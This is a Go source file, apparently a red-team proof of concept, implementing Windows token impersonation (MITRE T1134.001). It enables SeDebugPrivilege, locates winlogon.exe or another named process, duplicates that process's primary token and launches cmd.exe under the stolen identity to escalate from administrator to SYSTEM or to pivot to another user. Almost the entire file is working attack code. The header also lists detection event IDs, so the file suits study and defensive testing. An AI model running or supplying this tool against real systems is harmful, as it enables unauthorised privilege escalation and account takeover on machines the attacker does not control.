// +build windows

// Token Impersonation - MITRE ATT&CK T1134.001
//
// Steals a primary access token from another process, duplicates it, and
// spawns a new process under that identity via CreateProcessWithTokenW.
//
// Common pivots:
//   * Local admin -> SYSTEM by stealing winlogon.exe's token.
//   * Pivot to another logged-in user via explorer.exe.
//
// Privilege requirements:
//   - SeDebugPrivilege  (enabled programmatically; granted to Administrators).
//   - SeImpersonatePrivilege (granted to Administrators by default; required
//                             by CreateProcessWithTokenW).
//
// CreateProcessAsUser is the alternative API but requires SeAssignPrimaryToken
// which only LocalSystem holds, so this PoC uses CreateProcessWithTokenW.
//
// Detection: Sysmon Event ID 10 (ProcessAccess) on the source PID with
// GrantedAccess including PROCESS_QUERY_INFORMATION; Security Event ID 4624
// logon type 9 (NewCredentials); 4688 with mismatched parent/user context.

package main

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32                    = syscall.NewLazyDLL("advapi32.dll")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

const (
	SE_PRIVILEGE_ENABLED  = 0x00000002
	TOKEN_DUPLICATE       = 0x0002
	TOKEN_QUERY           = 0x0008
	TOKEN_ADJUST_PRIVS    = 0x0020
	SecurityImpersonation = 2
	TokenPrimary          = 1
	MAXIMUM_ALLOWED       = 0x02000000
)

// EnableSeDebug elevates the current process token with SeDebugPrivilege so
// we can OpenProcess across security boundaries (e.g. SYSTEM processes).
func EnableSeDebug() error {
	var token windows.Token
	if err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		TOKEN_ADJUST_PRIVS|TOKEN_QUERY,
		&token,
	); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	name, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if err := windows.LookupPrivilegeValue(nil, name, &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValue: %w", err)
	}

	var tp windows.Tokenprivileges
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	if err := windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil); err != nil {
		return fmt.Errorf("AdjustTokenPrivileges (admin?): %w", err)
	}
	fmt.Println("[+] SeDebugPrivilege enabled on current process")
	return nil
}

// FindPID returns the PID of the first process matching exeName (case-insensitive).
func FindPID(exeName string) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}
	for {
		if strings.EqualFold(windows.UTF16ToString(pe.ExeFile[:]), exeName) {
			return pe.ProcessID, nil
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return 0, fmt.Errorf("process %q not found", exeName)
		}
	}
}

// StealTokenAndSpawn opens targetPID, duplicates its primary token as a new
// primary token, and launches cmdLine under it via CreateProcessWithTokenW.
func StealTokenAndSpawn(targetPID uint32, cmdLine string) error {
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, targetPID)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", targetPID, err)
	}
	defer windows.CloseHandle(proc)

	var srcToken windows.Token
	if err := windows.OpenProcessToken(proc, TOKEN_DUPLICATE|TOKEN_QUERY, &srcToken); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer srcToken.Close()

	var dupToken windows.Token
	if err := windows.DuplicateTokenEx(
		srcToken,
		MAXIMUM_ALLOWED,
		nil,
		SecurityImpersonation,
		TokenPrimary,
		&dupToken,
	); err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer dupToken.Close()

	cmdUTF16, _ := syscall.UTF16PtrFromString(cmdLine)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, callErr := procCreateProcessWithTokenW.Call(
		uintptr(dupToken),
		0, // dwLogonFlags
		0, // lpApplicationName (use cmdLine)
		uintptr(unsafe.Pointer(cmdUTF16)),
		0, // dwCreationFlags
		0, // lpEnvironment
		0, // lpCurrentDirectory
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %w", callErr)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	fmt.Printf("[+] Spawned PID %d (%s) under stolen token from PID %d\n",
		pi.ProcessId, cmdLine, targetPID)
	return nil
}

func main() {
	target := "winlogon.exe"
	cmdLine := `C:\Windows\System32\cmd.exe`
	if len(os.Args) >= 2 {
		target = os.Args[1]
	}
	if len(os.Args) >= 3 {
		cmdLine = os.Args[2]
	}

	if err := EnableSeDebug(); err != nil {
		fmt.Println("[-]", err)
		return
	}

	pid, err := FindPID(target)
	if err != nil {
		fmt.Println("[-]", err)
		return
	}
	fmt.Printf("[+] %s -> PID %d\n", target, pid)

	if err := StealTokenAndSpawn(pid, cmdLine); err != nil {
		fmt.Println("[-]", err)
	}
}
